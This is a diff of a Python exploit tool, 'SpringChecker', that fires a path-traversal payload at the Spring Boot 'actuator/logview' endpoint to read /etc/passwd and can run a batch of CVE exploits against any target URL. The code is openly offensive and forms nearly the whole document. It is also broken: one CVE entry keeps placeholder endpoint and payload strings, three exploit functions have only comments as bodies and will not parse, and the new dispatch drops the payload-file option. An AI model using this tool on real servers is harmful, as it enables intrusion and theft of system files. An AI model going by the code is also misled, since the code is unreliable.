@@ -5,28 +5,16 @@
 import requests
 import argparse
 from urllib.parse import urljoin
+import random
 
-# Function to exploit CVE-2023-29986
-def exploit_cve_2023_29986(target_url, proxies, payload_file=None):
-    endpoint = "actuator/logview"
-    default_payload = "../../../etc/passwd"
-    payloads = [default_payload]
-    if payload_file:
-        with open(payload_file, 'r') as f:
-            payloads = f.readlines()
-    execute_exploit(target_url, endpoint, payloads, proxies)
+# User-Agent list for random selection
+ua = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.93 Safari/537.36",
+    # ... (other user-agents)
+]
 
-# Function to exploit CVE-2023-38286
-def exploit_cve_2023_38286(target_url, proxies, payload_file=None):
-    endpoint = "some_endpoint_for_cve_2023_38286"  # Replace with actual endpoint
-    default_payload = "some_default_payload"  # Replace with actual payload
-    payloads = [default_payload]
-    if payload_file:
-        with open(payload_file, 'r') as f:
-            payloads = f.readlines()
-    execute_exploit(target_url, endpoint, payloads, proxies)
-
-# Function to execute the exploit
+# Base exploit function
 def execute_exploit(target_url, endpoint, payloads, proxies):
     if not target_url.endswith('/'):
         target_url += '/'
@@ -39,7 +27,7 @@ def execute_exploit(target_url, endpoint, payloads, proxies):
         except Exception as e:
             print(f"An error occurred with payload {payload}: {e}")
 
-# Function to display full HTTP response
+# Display full HTTP response
 def display_response(response, payload):
     print(f"Full HTTP Response for payload {payload}:\n")
     print(f"HTTP/1.1 {response.status_code} {response.reason}")
@@ -49,27 +37,61 @@ def display_response(response, payload):
     print(response.text)
     print("="*50)
 
-if __name__ == "__main__":
+# Exploit functions
+def exploit_cve_2023_29986(target_url, proxies, payload_file=None):
+    endpoint = "actuator/logview"
+    default_payload = "../../../etc/passwd"
+    payloads = [default_payload]
+    if payload_file:
+        with open(payload_file, 'r') as f:
+            payloads = f.readlines()
+    execute_exploit(target_url, endpoint, payloads, proxies)
+
+def exploit_cve_2023_38286(target_url, proxies, payload_file=None):
+    endpoint = "some_endpoint_for_cve_2023_38286"
+    default_payload = "some_default_payload"
+    payloads = [default_payload]
+    if payload_file:
+        with open(payload_file, 'r') as f:
+            payloads = f.readlines()
+    execute_exploit(target_url, endpoint, payloads, proxies)
+
+def exploit_cve_2022_22965(target_url, proxies):
+    # ... (exploit code for CVE-2022-22965)
+
+def exploit_cve_2022_22963(target_url, proxies):
+    # ... (exploit code for CVE-2022-22963)
+
+def exploit_cve_2022_22947(target_url, proxies):
+    # ... (exploit code for CVE-2022-22947)
+
+# Main function
+def main():
     parser = argparse.ArgumentParser(description="SpringChecker: A tool for checking vulnerabilities in Spring Boot applications")
-    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
+    parser.add_argument("-t", "--target", required=True, help="Target URL")
     parser.add_argument("-p", "--proxy", help="Proxy URL (optional)")
     parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
-    parser.add_argument("-c", "--cve", choices=['CVE-2023-29986', 'CVE-2023-38286'], help="CVE to exploit (optional)")
-    
+    parser.add_argument("-c", "--cve", help="CVE to exploit (optional)")
+
     args = parser.parse_args()
     proxies = {}
     if args.proxy:
-        proxies = {
-            "http": args.proxy,
-            "https": args.proxy
-        }
-    
+        proxies = {"http": args.proxy, "https": args.proxy}
+
+    exploit_functions = {
+        'CVE-2023-29986': exploit_cve_2023_29986,
+        'CVE-2023-38286': exploit_cve_2023_38286,
+        'CVE-2022-22965': exploit_cve_2022_22965,
+        'CVE-2022-22963': exploit_cve_2022_22963,
+        'CVE-2022-22947': exploit_cve_2022_22947
+    }
+
     if args.cve:
-        if args.cve == 'CVE-2023-29986':
-            exploit_cve_2023_29986(args.target, proxies, args.payload_file)
-        elif args.cve == 'CVE-2023-38286':
-            exploit_cve_2023_38286(args.target, proxies, args.payload_file)
+        exploit_functions.get(args.cve, lambda x, y: print(f"Unknown CVE: {args.cve}"))(args.target, proxies)
     else:
-        print("Running all exploits...")
-        exploit_cve_2023_29986(args.target, proxies, args.payload_file)
-        exploit_cve_2023_38286(args.target, proxies, args.payload_file)
+        for cve, exploit_func in exploit_functions.items():
+            print(f"Running exploit for {cve}...")
+            exploit_func(args.target, proxies)
+
+if __name__ == "__main__":
+    main()
